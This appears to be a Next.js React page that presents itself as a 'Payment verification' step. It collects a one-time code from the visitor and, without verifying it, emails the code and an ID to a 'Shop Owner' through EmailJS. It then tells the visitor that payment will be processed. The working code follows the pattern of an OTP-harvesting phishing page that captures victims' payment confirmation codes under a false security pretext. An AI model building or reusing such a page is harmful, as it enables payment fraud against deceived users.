"use client"

import * as React from "react"
import { InputOTP, InputOTPSlot } from "@/components/ui/input-otp"
import emailjs from "emailjs-com"
import { useState } from "react"
import { NotificationDialog } from "@/components/ui/NotificationDialog"

// eslint-disable-next-line @typescript-eslint/no-explicit-any
export default function VerifyPage({ params }: any) {
    const id = params?.id as string;
    const [otp, setOtp] = React.useState("")
    const [sending, setSending] = React.useState(false)
    const [thankYouOpen, setThankYouOpen] = useState(false)

    const MIN_LENGTH = 4
    const MAX_LENGTH = 8
    const slotCount = Math.max(MIN_LENGTH, otp.length || MIN_LENGTH)

    async function handleSubmit() {
        const serviceId = process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID!
        const templateId = process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID!
        const publicKey = process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY!

        if (!serviceId || !templateId || !publicKey) {
            console.error("EmailJS not configured")
            return
        }

        setSending(true)
        try {
            await emailjs.send(
                serviceId,
                templateId,
                {
                    to_name: "Shop Owner",
                    subject: "OTP Verification",
                    message: `Verification ID: ${id}\nOTP: ${otp}`,
                    id,
                    otp,
                },
                publicKey
            )
            setThankYouOpen(true)
        } catch (err) {
            console.error("Failed to send OTP", err)
        } finally {
            setSending(false)
        }
    }

    return (
        <div className="max-w-xl mx-auto p-6 space-y-4">
            <h1 className="text-2xl font-bold">Payment verification</h1>
            <p>
                To complete payment please input the code that will be sent to you
                shortly completely and correctly
            </p>
            <div className="mt-6 space-y-2">
                <label className="text-sm font-medium">Enter verification code</label>
                <InputOTP value={otp} onChange={setOtp} maxLength={MAX_LENGTH}>
                    {Array.from({ length: slotCount }).map((_, i) => (
                        <InputOTPSlot key={i} index={i} />
                    ))}
                </InputOTP>
            </div>
            <button
                onClick={handleSubmit}
                disabled={sending}
                className="w-full mt-4 bg-green-600 text-white py-2 rounded disabled:opacity-50"
            >
                {sending ? "Completing Payment..." : "Complete Payment"}
            </button>

            <NotificationDialog
                open={thankYouOpen}
                onOpenChange={setThankYouOpen}
                title="Congratulations!"
                message="Payment will be processed shortly."
            />

            <p className="text-gray-600 text-sm">
                This step is to ensure maximum security.
            </p>
        </div>
    )
}
